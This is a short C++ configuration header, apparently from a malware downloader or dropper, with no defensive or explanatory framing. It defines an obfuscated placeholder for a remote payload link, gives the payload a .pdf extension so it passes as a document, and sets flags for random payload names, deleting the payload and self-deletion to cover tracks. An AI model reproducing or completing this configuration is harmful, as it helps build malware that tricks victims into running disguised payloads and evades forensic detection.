#pragma once
#include "obfuscation.h"

#define PAYLOAD_LINK OBFW(L"PUT PAYLOAD LINK HERE!")
#define PAYLOAD_NAME OBFW(L"This can be ignored if randompayloadname is set to true")
#define PAYLOAD_FILE_EXTENSION OBFW(L".pdf")

namespace config
{
	constexpr inline bool randompayloadname = true;

	constexpr inline bool deletepayload = true;
	constexpr inline bool selfedelete = true;
};